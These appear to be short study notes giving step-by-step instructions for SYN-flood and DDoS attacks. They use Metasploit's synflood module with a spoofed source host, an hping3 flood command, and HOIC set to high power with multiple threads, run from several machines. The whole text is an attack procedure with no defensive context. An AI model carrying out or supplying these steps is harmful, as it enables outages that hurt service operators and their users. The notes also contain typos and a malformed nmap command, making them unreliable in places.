* SYN Flood using metasploit:
  - First scan the target machine with "namp" to check which ports are open:
        nmap -p <target_ip>
  - Run msfconsole
  - Run below commands in msfconsole:
        # use auxiliary/dos/tcp/synflood
        # show options
            set RHOST
            set RPORT
            set SHOST (spoofable source host)
            set TIMEOUT (eg 20000)

* Send huge amounts of SYN packets via hping3
    - Run below command to start the attack:
        # hping3 -S <target_IP> -a <attacker's_ip> -p <port> --flood

* Performing DDoS using HOIC(high Orbit on Cannon) Tool:
    - Open the HOIC GUI
    - After the GUI appears click on "+" below targets.
    - Type the target url
    - Set power to high
    - Select "GenericBoost.hoic" from drop-down list
    - Set the "Threads" value to 20.
    Peform the above steps from different machine to create a DDoD scenario
